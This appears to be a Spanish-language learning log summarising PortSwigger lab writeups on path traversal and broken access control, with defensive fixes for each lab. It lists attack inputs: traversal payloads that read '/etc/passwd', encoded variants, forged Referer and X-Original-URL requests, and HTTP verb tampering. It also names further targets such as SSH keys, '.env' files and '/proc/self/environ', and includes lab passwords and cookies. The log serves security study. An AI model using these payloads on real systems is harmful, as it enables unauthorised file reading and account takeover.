5. **¿Por qué el dev escribe el filter?**: razones habituales — "sanitización defensiva" (preferir limpiar input que rechazarlo), creer que un solo replace alcanza para inputs no maliciosos, confundir `replace` con loop recursivo.
6. **La defensa correcta no cambia entre labs del cluster**: `os.path.realpath(os.path.join(BASE, filename))` + `startswith(BASE + sep)`. Resuelve relativo, absoluto, dobles barras, encoding, links simbólicos en una operación. Independiente de cómo se ve el payload de entrada.
7. **Tabla de progresión del cluster**: simple-case (sin defensa) → absolute-path-bypass (defensa "rechazo de `../`", bypass conceptual con path absoluto) → stripped-non-recursively (defensa "strip de `../`", bypass por construcción con `....//`). Cada lab muestra una defensa naïve más sofisticada y rompe la asunción detrás de ella.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-sequences-stripped-non-recursively/writeup.md`**: 6 secciones, request/response real, antipatrón Python `replace('../', '')` con trace char-por-char del bypass, generalización a SQLi/XSS/URL prefixes, tabla comparativa de los 3 labs del cluster con asunción rota en cada uno.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:`. Ahora linkea los 3 labs del cluster Path Traversal.

### Lección de proceso

User resolvió el lab a la primera con el payload propuesto. No probó el caso intermedio (`../../../etc/passwd` para confirmar que se strippea). El writeup documenta el comportamiento esperado del caso strippeado por inferencia desde la descripción del lab y el comportamiento de `replace` en lenguajes comunes, sin claim de medición empírica. Heurística: cuando el payload bypass funciona a la primera, el caso "lab stock fallaría" se infiere — está bien marcarlo como inferencia, no como observación.

## [2026-05-08] — Writeup PortSwigger File path traversal, absolute path bypass

Segundo lab del cluster File path traversal (Practitioner). La app filtra secuencias `../` pero acepta paths absolutos. Payload `filename=/etc/passwd` bypass-ea el filter porque no contiene `..`. Resuelto en una request al cambiar el payload del lab simple por uno absoluto.

### Hallazgos no triviales documentados en el writeup

1. **El filter de `../` asume que traversal requiere subir directorios**: un path absoluto no sube — empieza desde la raíz. La asunción del filter no cubre ese caso. Bypass conceptual, no de encoding/escape.
2. **`os.path.join` y `Path.resolve` descartan componentes anteriores cuando uno posterior es absoluto**: comportamiento documentado de Python y Java (no bug del lenguaje). `os.path.join('/var/www/images', '/etc/passwd')` → `/etc/passwd`. El bug está en el código que asume que el join queda dentro del directorio base.
3. **Concatenación textual cruda NO es vulnerable a este payload específico**: `'/var/www/images/' + '/etc/passwd'` = `/var/www/images//etc/passwd`, que canonicaliza a `/var/www/images/etc/passwd` (dentro del base). Que el bypass funcione confirma path-join "inteligente" o `chdir+open` relativo.
4. **Por qué Practitioner y no Apprentice**: el payload es más simple que el del lab Apprentice anterior. Lo que sube la dificultad es el cambio de mental model — reconocer que el filter asume `..` y que la asunción es bypass-eable conceptualmente.
5. **Patrón general "string filters de input"**: cada filter de string asume cómo se ve un payload "malo" (`../` , empieza con `..`, contiene `/`, etc.). Cada asunción tiene bypass: path absoluto, `....//` post-replace, encoding, doble encoding. Los siguientes labs del cluster son variantes de este mismo principio.
6. **La defensa correcta no cambia entre labs del cluster**: `os.path.realpath(os.path.join(BASE, filename))` + `startswith(BASE)`. Cubre relativo, absoluto, encoding, dobles barras y links simbólicos en una operación. String filters siempre van a tener bypass.
7. **Variantes adicionales si el filter también rechaza paths absolutos**: URL encoding (`%2fetc%2fpasswd`), doble encoding (`%252fetc%252fpasswd`) cuando hay decodificación dos veces, backslash en Windows, UNC paths (`\\localhost\c$\...`), `file://` protocol si el código usa una librería que acepta URI.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-absolute-path-bypass/writeup.md`**: 6 secciones, request/response real con `/etc/passwd`, dos antipatrones (chdir+open relativo vs `os.path.join`) y por qué ambos son bypass-eables, contraste con concatenación textual cruda (que NO sería vulnerable a este payload), defensa correcta idéntica al lab simple, variantes para filters más estrictos.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:`. Ahora linkea ambos labs del cluster Path Traversal (simple-case + absolute-path-bypass).

### Lección de proceso

User reportó "lab solved" mostrando primero la página de descripción de PortSwigger.com en lugar de la URL del lab instance. Detalles operacionales que confunden: la página `portswigger.net/web-security/.../lab-X` es estática (descripción del problema), mientras que la URL del lab corre en `<labid>.web-security-academy.net/...` y muestra el banner "solved". Confirmación correcta requiere mirar la URL del lab, no la página del catálogo. Generalización: cuando se reporta "lab solved", verificar que la screenshot venga de la URL del lab instance, no del catálogo.

## [2026-05-08] — Writeup PortSwigger File path traversal, simple case

Primer lab del cluster File path traversal (Apprentice, baseline sin defensas). Vector: el endpoint `/image?filename=58.jpg` concatena el `filename` a un directorio base (`/var/www/images/`) y abre el archivo sin canonicalizar. Payload `filename=../../../etc/passwd` resuelve a `/etc/passwd` durante la resolución del path por el syscall `open()`. Response 200 con `Content-Type: image/jpeg` pero body de texto plano: el handler pipea bytes sin chequear MIME real.

### Hallazgos no triviales documentados en el writeup

1. **Path traversal es bug de canonicalización, no de filtrado**: el server compone `base + input` y asume que el resultado queda dentro de `base`. La defensa correcta es canonicalizar (resolver `..`, links, encodings) y validar el resultado, no validar el input crudo.
2. **`/etc/passwd` como target canónico**: world-readable, signature inconfundible (`root:x:0:0:...`), portátil POSIX. No expone secretos críticos por sí solo (los hashes están en `/etc/shadow`). Por eso es la prueba estándar de traversal sin riesgo de falso positivo.
3. **Mismatch Content-Type vs body es señal**: el server declaró `image/jpeg` pero devolvió texto. El handler está cableado a "siempre image/jpeg" porque el endpoint se llama `/image`; no infiere MIME del contenido. Si se prueba traversal desde el browser y se ve "imagen rota", no asumir que falló — mirar el body en Burp.
4. **Heurística de profundidad de `../`**: `..` desde `/` resuelve a `/` en POSIX (root es su propio padre), así que sobreestimar la profundidad no rompe nada. Por eso un payload de 8-10 niveles es heurística común cuando no se conoce el cwd.
5. **Filtro inicial de Burp oculta imágenes**: HTTP history filtra por defecto "CSS, image and general binary content". Endpoint vulnerable a traversal vía parámetro de imagen es invisible hasta desactivar el filtro. Insight operacional: para auditar endpoints de assets, ajustar el filtro antes de empezar.
6. **Mapa de defensas comunes (vista preview de los próximos labs)**: filter de `../` (bypass con `%2e%2e%2f`, doble encoding), filter non-recursive (bypass con `....//`), validación de prefijo (bypass con `/var/www/images/../../../etc/passwd`), validación de sufijo (bypass con null byte `%00.jpg` o segmentación de path). Cada uno corresponde a un lab separado.
7. **Vectores derivados del mismo bug**: lectura de código fuente (`/var/www/html/index.php`), config files (`.env`, `web.xml`, `nginx.conf`), keys SSH, logs como vector a RCE (log poisoning), `/proc/self/environ` para vars de entorno con secretos.

### Archivos nuevos

- **`learning/portswigger/file-path-traversal-simple-case/writeup.md`**: 6 secciones, request/response real, antipatrón Python `BASE + filename` vs fix con `os.path.realpath` + validación de prefijo, alternativa con IDs en lugar de paths libres, mapa de defensas comunes y sus bypass, 5 vectores derivados.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-lfi-rfi.md` (que ya cubre LFI/RFI/Path Traversal con sus aliases). Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`: + writeup en `learning_refs:` (antes era `[]`, primer learning_ref del archivo).

### Lección de proceso

User no había desactivado el filtro de imágenes en Burp, así que en el primer recon no veía la request del endpoint vulnerable. El instinto inicial fue describir el vector en abstracto; en cambio, el siguiente paso operacional correcto fue diagnosticar el blocker en su tooling (filtro de Burp) antes de avanzar. Generalización: cuando el user reporta "no veo X", priorizar troubleshooting de la herramienta antes que avanzar con la teoría.

## [2026-05-08] — Writeup PortSwigger Referer-based access control

Treceavo lab del cluster Access Control. Practitioner. Vector: el endpoint `/admin-roles?username=X&action=upgrade` no chequea sesión/rol; chequea el header `Referer`. Si `Referer` matchea `/admin`, autoriza. Razonamiento del dev: "si el cliente vino del admin panel (que sí está protegido), es admin". El bug: `Referer` lo setea el cliente. En Burp/curl se forja. Wiener manda la request con su sesión + `Referer: https://lab/admin` → 302 → admin.

### Hallazgos no triviales documentados en el writeup

1. **Referer es client-controlled**: cualquier cliente lo manda como quiera. Browsers también lo manipulan vía `Referrer-Policy`, link tags, JS. Curl/Burp lo forjan trivialmente. No es atributo de seguridad.
2. **"Browser-set automático" ≠ trustworthy**: trampa específica del Referer es que se siente browser-set (no es header que devs setean explícitamente como `Authorization`). Pero el browser obedece al cliente, y el cliente puede ser un atacante con DevTools.
3. **Familia de headers client-controlled mal usados como authz**: `Referer` (este lab), `X-Forwarded-For` (IP whitelisting), `Origin` (CSRF sin token), `User-Agent` (anti-bot), cookies arbitrarias tipo `Admin=true`. Misma clase de error: confiar en dato que el cliente decide.
4. **Cuándo Referer es legítimamente útil**: anti-CSRF defensa-en-profundidad (validar dominio, no path interno) sumado a CSRF tokens; analytics; hotlink protection; UX (redirect post-login). Patrón: información de bajo trust complementando otra defensa, no decisión principal.
5. **Razonamiento defensivo del dev (auth retrofit)**: app empezó sin admin panel; cuando se agregó, el dev extrapoló la protección del UI (`/admin` requiere admin) a los endpoints de acción (`/admin-roles`) con la heurística "si llegaron desde admin, son admin". Testing manual con browser pasa pruebas porque el browser manda Referer correcto.
6. **Vectores adicionales**: Referer parcial/substring (`if 'admin' in referer`), Referer ausente con fallback "interno", redirect chain para forzar Referer en browser real, `Referrer-Policy: unsafe-url` para forzar full URL.
7. **Patrón estructural común con los 3 labs Practitioner previos del cluster**: server delega autorización a un atributo manipulable por el atacante (path en url-based, método en method-based, "vino del paso 1" en multi-step, Referer en este). Fix común: authz por sesión, único atributo que el server controla y ata al user autenticado.

### Archivos nuevos

- **`learning/portswigger/referer-based-access-control/writeup.md`**: 6 secciones, request/response real con `Referer` falsificado, antipatrón Flask vs fix con `@require_admin` decorator + CSRF token, tabla comparativa con los 3 labs Practitioner previos del cluster (URL-based, method-based, multi-step, referer-based), 5 vectores adicionales con `Referer`.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-broken-access-control.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-broken-access-control.md`: + writeup en `learning_refs:`, + 7 aliases nuevos (`Referer-based access control`, `Referer header authz`, `client-controlled headers`, `header trust bypass`, `X-Forwarded-For trust`, `Origin header trust`, `browser-set no es trustworthy`).

### Lección de proceso

User resolvió el lab antes de pedir el writeup, pero esta vez con una pregunta sustantiva: "¿qué tiene de distinto este vs los anteriores?". Respondí inline antes de escribir el writeup, contrastando los 4 labs Practitioner del cluster en una tabla. Pregunta del user destapó que la diferencia entre Referer-based y los otros bypass del cluster no era obvia desde el bug raw — el patrón estructural es idéntico, la diferencia es **qué atributo de la request el server confía erróneamente**. El writeup encarna esa narrativa.

---

## [2026-05-07] — Writeup PortSwigger Multi-step process with no access control on one step

Doceavo lab del cluster Access Control. Practitioner. Vector: **multi-step bypass / workflow flaw**. La acción admin de promote tiene 2 pasos (POST `username&action=upgrade` → confirm page → POST `confirmed=true`). El check de admin está en el paso 1 (render del confirm page), el paso 2 no re-valida porque "asume que llegaste desde paso 1". Wiener salta directo al paso 2 con `action=upgrade&confirmed=true&username=wiener` → 302 → admin.

### Hallazgos no triviales documentados en el writeup

1. **HTTP es stateless, el workflow lo controla el cliente**: la UI dicta el orden de la UX, no del request. Atacante manda cualquier endpoint en cualquier orden. Mental model UI-first del dev produce el bug; el atacante piensa API-first.
2. **Páginas de confirmación no son auth gate**: el "are you sure?" se siente como barrera, pero es UX. Atacante salta directo al commit.
3. **`confirmed=true` como flag client-controlled**: si el server diferencia ramas (`if confirmed: commit() else: render()`) según un campo del cliente, el cliente decide la rama. La auth tiene que estar antes del fork, no en una rama.
4. **CSRF token no protege contra esto**: a veces el dev cree que CSRF token del paso 1 protege paso 2. CSRF protege contra cross-site forge, no contra requests legítimos del propio user. Wiener autenticado tiene su propio CSRF token.
5. **Familia de variantes de multi-step bypass**: saltarse el paso anterior (este lab), saltarse el paso final (evita auditoría), re-ejecutar pasos (doble crédito), reordenar pasos (paso 3 antes que 2), TOCTOU (datos cambian entre pasos), mixing de actores (paso 1 sesión A + paso 2 sesión B).
6. **Fix correcto con state server-side**: workflow guarda el estado entre pasos en memoria/DB del server con tokens cortos (TTL 5 min) asociados a la sesión que los creó. Cliente no controla el estado. + auth check en cada handler que muta estado.
7. **Patrón estructural común con los 2 labs Practitioner previos del cluster**: todos son **defensa colocada en un punto del pipeline; atacante alcanza el efecto evitando ese punto**. URL-based (frontend vs backend), method-based (filtro vs handler), multi-step (paso intermedio vs paso final). Fix: deny by default + auth en cada operación con efecto.

### Archivos nuevos

- **`learning/portswigger/multi-step-process-with-no-access-control-on-one-step/writeup.md`**: 6 secciones, request/response real con `action=upgrade&confirmed=true&username=wiener`, antipatrón (auth check en render del confirm page) vs fix (auth en commit + state server-side con tokens), tabla comparativa con los 2 labs Practitioner previos del cluster, lista de 6 variantes de multi-step bypass.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-broken-access-control.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-broken-access-control.md`: + writeup en `learning_refs:`, + 7 aliases nuevos (`multi-step bypass`, `workflow flaw`, `state machine bypass`, `confirmed=true bypass`, `saltarse paso intermedio`, `business logic flaw`, `paso final sin authz`).

### Lección de proceso

User resolvió el lab en paralelo mientras yo escribía el writeup del lab anterior (method-based). Excepción explícita al workflow "resolver con user antes de writeup": el user ya lo resolvió antes de pedir el writeup. Captura real (cookie, body, response 302) provista por user, escribí el writeup con datos reales sin tener que volver a resolverlo.

---

## [2026-05-07] — Writeup PortSwigger Method-based access control can be circumvented

Onceavo lab del cluster Access Control. Practitioner. Vector: **verb tampering** / method-based bypass. El filtro de admin chequea sólo si el método es `POST` literal; el handler del controller (Servlet doGet+doPost, `@RequestMapping` sin method=) acepta múltiples métodos con la misma lógica. Cambiar a `GET` con params en query string saltea el filtro y promueve a wiener a admin. Endpoint vulnerable: `/admin-roles?username=wiener&action=upgrade`.

### Hallazgos no triviales documentados en el writeup

1. **Patrón estructural del bug**: filtro de auth acoplado al método (`if request.method == "POST" and path == "/admin"`), handler que acepta múltiples métodos con lógica idéntica (Servlet con `doGet` y `doPost` delegando al mismo `handle()`). El gap entre los dos abre el bypass.
2. **Método HTTP no es atributo de seguridad**: enumerar métodos en filtros es allowlist al revés. La regla correcta es deny by default (auth en cada handler/anotación), no enumerar verbos a chequear.
3. **400 Bad Request ≠ 401 Unauthorized — no confundirlos**: 400 dice "el handler corrió, params no llegaron". Si pasas auth y ves 400, el bug es de transporte (params en lugar incorrecto, encoding wrong, content-type wrong); seguís con eso, no con auth. 401/403 = todavía bloqueado, probá otro método. Cada code marca un punto distinto en el pipeline.
4. **Trampa puntual**: GET con body no se parsea en frameworks default (Spring, Express, Flask). Los params tienen que ir en query string. Mandé el primer intento con body en GET y obtuve "missing parameter" (auth ya pasada, pero handler no lee body en GET).
5. **Familia completa de verbos para probar**: `POST`, `GET`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS`, custom (`POSTX`, `FOOBAR`), WebDAV (`PROPFIND`, `MKCOL`, `LOCK`, `COPY`, `MOVE`), method override headers (`X-HTTP-Method-Override`). Si el filtro enumera, cualquier verbo no enumerado es candidato.
6. **Servlet Java es vector típico** (`doGet` + `doPost` que delegan al mismo `handle()`): legacy filter pattern donde la auth se escribió pensando POST de forms y el endpoint pasó a aceptar JSON via PUT/PATCH manteniendo el filtro original.
7. **Conexión con lab anterior `url-based-access-control-can-be-circumvented`**: ambos son **defensa parcial mal acoplada**. URL-based mira el path, method-based mira el método. Filtro y dispatcher tienen que coincidir en superficie completa, cualquier asimetría es bypass.

### Archivos nuevos

- **`learning/portswigger/method-based-access-control-can-be-circumvented/writeup.md`**: 6 secciones, request/response real (POST original con `username=wiener&action=upgrade` body → cambio a GET con query string), código Servlet Java mostrando el antipatrón vs 3 fixes (allowlist de métodos, auth en cada handler, deny-by-default con `@PreAuthorize`), tabla de familia de verbos explotables.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-broken-access-control.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-broken-access-control.md`: + writeup en `learning_refs:`, + 7 aliases nuevos (`method-based access control bypass`, `verb tampering`, `HTTP method bypass`, `POSTX bypass`, `GET en lugar de POST`, `X-HTTP-Method-Override`, `filtro acoplado al metodo`).

### Lección de proceso

Lab resuelto WITH user. User capturó request original (POST admin) y experimentó con cambio de método. Punto de confusión real: al cambiar a GET con body, recibió 400 "Missing parameter" y pensó que seguía bloqueado. Aclaré la diferencia 400 vs 401 (auth ya pasó, params en lugar incorrecto), user movió params a query string en una iteración → solved. El writeup incluye esta lección como sección dedicada porque es trampa común en pentesting.

---

## [2026-05-07] — Writeup PortSwigger URL-based access control can be circumvented

Décimo lab del cluster Access Control. **Practitioner** (primer lab Practitioner del cluster). Vector estructuralmente distinto al resto: no IDOR ni mass assignment ni cookie tampering, sino **split-brain entre frontend y backend** sobre la URL de la request. Frontend (proxy/WAF) bloquea `/admin` mirando la request line; backend respeta `X-Original-URL` para routing. Atacante manda `GET /` (frontend permite) + `X-Original-URL: /admin/delete` (backend dispatch admin/delete) + `username=carlos` en body → 302 a `/admin`, lab solved.

### Hallazgos no triviales documentados en el writeup

1. **Split-brain como clase de bug general**: misma raíz que HTTP request smuggling, host header injection, HTTP/2 downgrade smuggling, cache poisoning vía header. Patrón: dos sistemas operando sobre la misma request pero interpretándola distinto. Solución estructural: normalizar agresivamente en el primer hop + duplicar checks críticos.
2. **Familia de headers explotables**: `X-Original-URL` (Symfony, IIS, Apache), `X-Rewrite-URL` (mod_rewrite legado), `X-Forwarded-Path`, `X-Forwarded-URI`, `X-Override-URL`, `X-HTTP-Method-Override`, `X-Custom-IP-Authorization` (Akamai). Cualquiera que el backend honre y el frontend no strippee es split-brain.
3. **Por qué el frontend no elimina el header (causas estructurales)**: fail-open por default (no hay regla por header no estándar), header pasa "como información" (proxies internos legítimos lo agregan), equipos separados sin revisar config del otro, doc oscura que habilita estos headers por default.
4. **Authz pertenece al backend, no al frontend**: el frontend opera con visibilidad limitada (URL, IPs, headers) y no conoce sesiones/roles/ownership. Cualquier decisión que requiera "este user es admin" tiene que hacerla el backend. Frontend = primera línea de defensa (rate-limit, OWASP rules); backend = decisión final.
5. **Detección del bug por canary path**: `GET / + X-Original-URL: /invalid` → si responde 404 (en lugar de 200 del home), confirma que el backend está routeando contra el header. Test trivial para fingerprint.
6. **Stripping correcto en frontend**: `proxy_set_header X-Original-URL "";` o mejor `proxy_pass_request_headers off;` con allowlist explícita (Host, X-Real-IP, X-Forwarded-For). Allowlist > blocklist.
7. **Body en GET funcionó**: `username=carlos` se mandó en body con method GET. No canónico pero el framework lo parseó como form data igual. La solución oficial sugiere query string; ambos vectores funcionan.

### Archivos nuevos

- **`learning/portswigger/url-based-access-control-can-be-circumvented/writeup.md`**: 6 secciones, request/response real, tabla de 7 headers explotables, tabla de 5 vulnerabilidades hermanas que comparten patrón split-brain (request smuggling, host header injection, HTTP/2 downgrade, cache poisoning), antipatrón nginx + fix con allowlist de headers + authz duplicada en backend.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-broken-access-control.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-broken-access-control.md`: + writeup en `learning_refs:`, + 7 aliases nuevos (`URL-based access control bypass`, `X-Original-URL bypass`, `X-Rewrite-URL bypass`, `header rewrite bypass`, `frontend backend split-brain`, `header smuggling routing`, `X-Forwarded-Path`).
- Cross-ref con `password-reset-poisoning-via-middleware` (mismo patrón de header confusion entre capas, distinto header).

### Lección de proceso

Lab resuelto WITH user. User capturó request final (`GET /` + `X-Original-Url: /admin/delete` + body `username=carlos`) con response 302 a /admin. Escribir el writeup obligó a documentar que el body funcionó en lugar del query string sugerido por la solución oficial, hallazgo concreto del lab.

---

## [2026-05-07] — Writeup PortSwigger Insecure direct object references (static file IDOR)

Noveno lab del cluster Access Control. Apprentice. Variante donde el IDOR está en el **layer de file serving**, no en endpoint dinámico: la app guarda transcripts del live chat como `/download-transcript/<N>.txt` con N entero secuencial. Sin authz check sobre el archivo. Decrementar el `2.txt` propio a `1.txt` accede al transcript de carlos, donde un user dictó su password al "soporte" en cleartext. Password carlos: `a2xhv9it2vspzij7jsy7`.

### Hallazgos no triviales documentados en el writeup

1. **IDOR no es solo `?id=` en URLs dinámicas**: cualquier path predecible que mapee a un recurso sin authz check es IDOR. Static files servidos por nginx/Express, CDN paths, image proxies, URLs de download. El concepto es agnóstico de capa: client-controlled mapping → server-resource sin check.
2. **Mental model que produce el bug**: dev separa "URLs dinámicas" (necesitan auth) de "static content" (público). Pero static content puede ser sensible. Reverse proxies seteados por defecto a "serve everything in /var/www" no pasan por threat model.
3. **Dos bugs encadenados, distinta naturaleza**: (a) IDOR sobre static files es access control; (b) credenciales en logs (transcript del chat conserva el password en cleartext) es data hygiene. Cualquiera solo no resuelve el lab; combinados, takeover en una request.
4. **Logs son recursos sensibles**: chat transcripts, audit trails, error reports pueden contener credenciales, PII, tokens. Mitigaciones: sanitización pre-storage (regex/ML detectando patterns tipo "password is", entropía alta), retention policies cortas, DLP en egress a SaaS de logs.
5. **CDN cache amplifica el riesgo**: si un reverse proxy cachea archivos sensibles del origin, el bug persiste incluso si el origin se corrige. `Cache-Control: private, no-store` en respuestas con datos de user.
6. **Layer correcto de fix**: storage interno fuera del webroot (`/var/data/transcripts/` no `/var/www/static/`), accedido sólo via app con authz check. Tokens random opacos por sesión que mapean a paths internos (doble check: token random + ownership match con sesión).

### Archivos nuevos

- **`learning/portswigger/insecure-direct-object-references/writeup.md`**: 6 secciones, request/response real (transcript de carlos completo con el password en cleartext), antipatrón nginx + Flask, fix con authz check + indirection layer por token random, tabla comparativa con los 4 labs IDOR previos del cluster mostrando el cambio sustancial (ID en path en lugar de query param, file serving en lugar de endpoint dinámico, dato leakeado proviene de logs no del recurso primario).

### Conexión inventario

- **Sin nuevos archivos en inventario**: quinto writeup IDOR del cluster, refuerza `analisis-idor.md` y `explotacion-idor.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-idor.md`: + writeup en `learning_refs:`.
- `inventario/04-explotacion/web/explotacion-idor.md`: + writeup en `learning_refs:`, + 8 aliases nuevos (`IDOR sobre static files`, `static file enumeration`, `predictable filenames`, `integer ID en path`, `transcript download IDOR`, `credenciales en logs`, `chat logs sin sanitizar`, `file serving sin authz`).

### Lección de proceso

Lab resuelto WITH user en una sola iteración. User capturó request real con response completa (transcript de carlos con password en cleartext). Writeup escrito con datos reales: cookie `H2sTqjGLNB2qIbzgKhHHz6KW1eLRSk9C`, password `a2xhv9it2vspzij7jsy7`, transcript completo citado.

---

## [2026-05-07] — Writeup PortSwigger User ID controlled by request parameter with password disclosure

Octavo lab del cluster Access Control. Apprentice. **Primer lab del cluster IDOR donde el chain pasa de horizontal a vertical privesc**: dos bugs encadenados (IDOR + password disclosure en HTML) elevan account takeover de admin desde una sesión user normal. La cuenta `/my-account?id=administrator` renderiza un form de change-password con `<input type=password value='wb8n28nija2hetkpyaql'/>`; login admin → delete carlos. Password admin: `wb8n28nija2hetkpyaql`.

### Hallazgos no triviales documentados en el writeup

1. **Chains cambian categoría de impacto**: IDOR aislado es info disclosure (medio); con un segundo bug que leakea credenciales pasa a privesc total + account takeover (crítico). Threat models tienen que considerar combinaciones, no bugs aislados.
2. **Password en cleartext del lado server es el pecado original**: si la DB guarda passwords reversibles (sin hash one-way), cualquier render del user object es leak potencial. Hash con bcrypt/argon2id/scrypt elimina la categoría entera (la app no puede recuperar el password ni queriendo).
3. **`type="password"` no es seguridad**: sólo afecta render visual del input (• en lugar de letras). El `value` viaja en cleartext en el HTML; View Source / DevTools / scrapeo lo ven directo. La máscara es UX contra shoulder surfing del propio user, no defensa contra el server.
4. **Por qué se prerellena el password (UX antipattern)**: dev quiere "no obligar al user a retipear el password al cambiar email", solución incorrecta: serializar el password en el form. Solución correcta: forms separados por concern + re-prompt de current password sólo cuando hace falta cambiar password.
5. **Vectores típicos de password leak en HTML**: `value` en input, hidden field "verificación", JSON embedded en `<script>` (`window.user = {password:...}`), form action con auth en URL, comments HTML de debug, sourcemaps con seeds, console.log del frontend.

### Archivos nuevos

- **`learning/portswigger/user-id-controlled-by-request-parameter-with-password-disclosure/writeup.md`**: 6 secciones, request/response real con HTML del form (incluyendo el `value` con el password en cleartext), antipatrón vs fix, tabla con los 4 labs IDOR del cluster mostrando cómo el dato leakeado determina el impacto (API key → data; password → control).

### Conexión inventario

- **Sin nuevos archivos en inventario**: cuarto writeup IDOR del cluster, refuerza `analisis-idor.md` y `explotacion-idor.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-idor.md`: + writeup en `learning_refs:`.
- `inventario/04-explotacion/web/explotacion-idor.md`: + writeup en `learning_refs:`, + 5 aliases nuevos (`password disclosure en HTML`, `IDOR chain a vertical privesc`, `plaintext password storage`, `mascara input no es seguridad`, `prefilled password value`).

### Lección de proceso

Lab resuelto WITH user. User capturó request real con response HTML completa, mostrando el form de change-password con el password admin en el atributo `value`. Writeup escrito con datos reales (password `wb8n28nija2hetkpyaql`, sesión `CwLLM4bN8HwptISiAR70zrqCSn2iHAbB`).

---

## [2026-05-07] — Writeup PortSwigger User ID controlled by request parameter with data leakage in redirect

Séptimo lab del cluster Access Control. Apprentice. Variante con **defensa parcial rota**: el server detecta el IDOR (`?id=carlos` con sesión de wiener), responde `302 Found` con `Location: /login`, pero el body de la 302 contiene la página de cuenta de carlos completa, con su API key renderizada. El browser sigue el redirect y oculta la fuga; Burp Repeater (sin follow) la ve directo. API key carlos: `3eIiuox6om0XcCWdJPKnEiTdmk5Pgp9E`.

### Hallazgos no triviales documentados en el writeup

1. **Status code y body son canales separados**: 302/403/404 indican intención al browser; el body lleva los bytes igual. Filtrar uno no filtra el otro. Cualquier cliente que no siga redirects (Repeater, `curl` sin `-L`, `fetch({redirect:'manual'})`, MITM proxies) ve el body.
2. **El antipatrón clásico**: `body = render_template(...)`, después `if user.id != session.user_id: return redirect()`. El render ya cargó queries y serializó datos antes del check; el redirect sólo cambia metadata, el body viaja igual.
3. **Testing por canal incorrecto**: el dev probablemente probó manualmente con browser ("URL bar → me lleva al login → funciona"), confiando en que el browser disimule la fuga. El browser nunca fue el límite de seguridad; el server lo es.
4. **Patrón general de data leakage en respuestas con error**: 302 con HTML completo del recurso negado, 403/500 con stack trace y query SQL, 401 con detalle que actúa de oracle de existence (enumeración de usernames), 404 que distingue "no existe" vs "no autorizado".
5. **Fix correcto**: authz **antes** de cargar/renderizar. Frameworks que retornan tuplas `(body, status, headers)` o donde el redirect helper no aborta el render son particularmente propensos a este bug.
6. **RFC 9110 §15.4** recomienda body breve indicando el redirect en respuestas 3xx, no contenido del recurso. Frameworks deberían generarlo automáticamente.

### Archivos nuevos

- **`learning/portswigger/user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/writeup.md`**: 6 secciones, request/response capturada real, antipatrón vs 3 fixes correctos, tabla de patrones equivalentes (302/403/404/401/500 con body filtrante), conexión con los 2 labs IDOR previos del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-idor.md` y `explotacion-idor.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-idor.md`: + writeup en `learning_refs:`.
- `inventario/04-explotacion/web/explotacion-idor.md`: + writeup en `learning_refs:`, + 5 aliases nuevos (`data leakage in redirect`, `redirect cosmetico no es authz`, `body leak en 302`, `render antes de check`, `status code no es access control`).

### Lección de proceso

Lab resuelto WITH user. User capturó request real (incluyendo el body completo de la 302 con la API key renderizada in-line). Writeup escrito con datos reales: status `302 Location: /login`, content-length 3759, API key `3eIiuox6om0XcCWdJPKnEiTdmk5Pgp9E`. Mecánica concreta documentada en lugar de versión genérica.

---

## [2026-05-07] — Writeup PortSwigger User ID controlled by request parameter, with unpredictable user IDs

Sexto lab del cluster Access Control. Apprentice. Variante del lab anterior con GUIDs (UUIDs) en lugar de usernames como identificador de user. Mismo bug subyacente (`/my-account?id=<X>` no chequea ownership), pero el atacante necesita conocer el GUID exacto del target. El blog público lo filtra: cada post linkea al autor vía `/blogs?userId=<GUID>`. Recon trivial, IDOR igual de explotable. API key carlos: `5Kdgi2v7XilvaBdBTwgdNzvxG1ahw6ej`.

### Hallazgos no triviales documentados en el writeup

1. **Random IDs no son control de acceso**: UUID v4 tiene ~5.3×10^36 valores, no enumerable por brute-force, pero el atacante no necesita forzar; necesita el ID concreto del target. Si la app expone ese ID en cualquier superficie pública, el random pierde valor.
2. **Superficies que típicamente filtran user IDs**: author links (`/posts?author=<UUID>`), comentarios firmados con `authorId` en JSON embebido, mentions/`@tags`, API responses con `expand=author`, shared resources públicos para SEO/reviews, Referer header, sourcemaps, error pages.
3. **UUID v1 es enumerable**: incluye timestamp + MAC del nodo generador. Conociendo un UUID legítimo, las variantes cercanas reducen el espacio de búsqueda de 2^122 a unos miles. Solo v4 (random) es seguro para IDs públicos.
4. **Cuándo UUIDs sí ayudan**: defensa-en-profundidad real cuando el ID **no leakea** (endpoints internos, recursos sólo accesibles por link directo tipo "anyone with the link", sharing explícito + invitados). En cuanto el ID aparece en alguna superficie pública, el random pasa a ser equivalente a un username.
5. **El bug es la línea `request.args['id']`, no el formato del ID**: cambiar de username a UUID no toca la causa raíz. Fix: derivar el target de la sesión cuando el endpoint es self-only.

### Archivos nuevos

